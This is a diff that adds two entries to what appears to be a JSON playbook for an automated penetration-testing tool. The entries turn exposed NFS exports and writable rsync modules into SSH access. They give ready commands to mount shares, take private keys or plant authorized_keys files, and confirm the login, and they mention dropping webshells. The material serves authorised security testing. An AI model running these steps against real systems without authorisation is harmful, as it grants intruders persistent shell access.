@@ -558,6 +558,49 @@
       ]
     },
     {
+      "id": "nfs-to-foothold",
+      "title": "NFS Export to Shell",
+      "hypothesis": "A world-readable or writable NFS export is a foothold, not just loot. Mount it: if it holds a user's home you can read an SSH private key or plant an authorized_keys (match your local UID to the owner so the server trusts the write), then SSH in. A writable web root takes a shell the same way.",
+      "tool": "mount",
+      "tools": [
+        "mount",
+        "showmount",
+        "ssh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:2049",
+        "nfs.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 58,
+      "proves": "a shell from a reachable NFS export — a looted or planted SSH key, or a webshell on a writable share",
+      "does_not_prove": "a shell when exports are squashed and hold nothing sensitive; no_root_squash is the stronger, separate privesc",
+      "report": {
+        "finding": "Sensitive/Writable NFS Export",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting"
+      ],
+      "commands": [
+        {
+          "tool": "showmount",
+          "run": "showmount -e {{target}}",
+          "note": "List the exports and who they are shared with. An export open to everyone (*) is the lead."
+        },
+        {
+          "tool": "mount",
+          "run": "sudo mount -t nfs {{target}}:{{export}} /mnt/nfs -o nolock",
+          "note": "Mount it. Read a home for an id_rsa to SSH in with, or (matching the owner's UID locally) write ~/.ssh/authorized_keys and then SSH: ssh -i key <user>@{{target}}; `id` confirms the foothold."
+        }
+      ]
+    },
+    {
       "id": "recon-telnet",
       "title": "Telnet Enumeration",
       "phase": "recon",
@@ -772,6 +815,53 @@
           "tool": "rsync",
           "run": "rsync -av rsync://{{target}}/{{module}}/ loot/rsync-{{module}}/",
           "note": "Pull the module down to your loot directory, then grep it for secrets."
+        }
+      ]
+    },
+    {
+      "id": "rsync-write-shell",
+      "title": "Rsync Writable Module to Shell",
+      "hypothesis": "An rsync module you can write to is a foothold when it maps onto a sensitive path. If it covers a home directory, push an authorized_keys and SSH in; if it covers a web root, push a webshell. List the modules, find the writable one, and write your way to a shell.",
+      "tool": "rsync",
+      "tools": [
+        "rsync",
+        "ssh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:873",
+        "rsync.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 58,
+      "proves": "code execution from a writable rsync module — a foothold via a planted key or webshell",
+      "does_not_prove": "a shell when every module is read-only or sandboxed away from a useful path",
+      "report": {
+        "finding": "Writable rsync Module",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync"
+      ],
+      "commands": [
+        {
+          "tool": "rsync",
+          "run": "rsync rsync://{{target}}/",
+          "note": "List the modules. A module marked writable (or one you can push a test file to) is the lead."
+        },
+        {
+          "tool": "rsync",
+          "run": "rsync -av ./authorized_keys rsync://{{target}}/{{module}}/.ssh/authorized_keys",
+          "note": "When the module maps onto a home directory, plant your public key. Then SSH in: ssh -i key <user>@{{target}}, and run `id; hostname` to capture the foothold."
+        },
+        {
+          "tool": "ssh",
+          "run": "ssh -i {{keyfile}} {{user}}@{{target}} id",
+          "note": "Confirm the planted-key login lands a shell; `uid=...` is your foothold."
         }
       ]
     },
